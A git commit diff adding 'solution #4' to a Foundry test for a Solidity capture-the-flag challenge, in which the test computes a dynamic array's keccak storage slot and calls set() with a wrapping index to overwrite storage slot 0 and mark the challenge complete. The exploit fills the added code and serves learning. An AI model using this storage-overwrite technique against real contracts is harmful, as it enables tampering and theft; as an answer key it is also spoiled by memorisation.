c48e6fcaa907bcea11b90c324fa374413461b577
eugenioclrc <eugenioclrc@gmail.com>
2022-07-28 11:40:17 -0300

    solution #4

--- test/4-mapping.sol
+++ test/4-mapping.sol
@@ -20,11 +20,28 @@ contract Challenge4Test is Test {
         vm.label(player, "Player");
     }
 
+    
     function testExample() public {
         vm.startPrank(address(player));
 
-        // tu codigo aca
+        // slot 0
+        emit log_named_uint("slot 0", uint256(keccak256(abi.encode(0))));
+        // slot 1
+        emit log_named_uint("slot 1", uint256(keccak256(abi.encode(1))));
+        uint256 slot1 = uint256(keccak256(abi.encode(1)));
+
+        target.set(type(uint256).max - slot1 + 1, 1);
         
         assertTrue(target.isComplete());
     }
+    
+    /*
+    function testInvariantComplete(uint256 i, uint256 j) public {
+        target.set(i, j);
+        //emit log_named_uint("complete", target.isComplete() ? 1 : 0);
+
+        assertTrue(target.isComplete() == false);
+
+    }
+    */
 }
